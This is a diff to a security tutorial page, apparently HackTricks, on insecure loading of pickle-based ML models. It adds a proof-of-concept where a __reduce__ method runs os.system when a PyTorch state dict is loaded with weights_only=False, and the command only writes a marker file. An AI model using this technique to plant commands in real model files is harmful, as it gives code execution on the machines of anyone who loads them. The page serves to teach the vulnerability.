@@ -26,5 +26,48 @@ At the time of the writting these are some examples of this type of vulneravilit
 
 Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.
 
+Example:
+
+- Create the model:
+
+```python
+# attacker_payload.py
+import torch
+import os
+
+class MaliciousPayload:
+    def __reduce__(self):
+        # This code will be executed when unpickled (e.g., on model.load_state_dict)
+        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))
+
+# Create a fake model state dict with malicious content
+malicious_state = {"fc.weight": MaliciousPayload()}
+
+# Save the malicious state dict
+torch.save(malicious_state, "malicious_state.pth")
+```
+
+- Load the model:
+
+```python
+# victim_load.py
+import torch
+import torch.nn as nn
+
+class MyModel(nn.Module):
+    def __init__(self):
+        super().__init__()
+        self.fc = nn.Linear(10, 1)
+
+model = MyModel()
+
+# ⚠️ This will trigger code execution from pickle inside the .pth file
+model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
+
+# /tmp/pwned.txt is created even if you get an error
+```
+
+
+
 
 {{#include ../banners/hacktricks-training.md}}
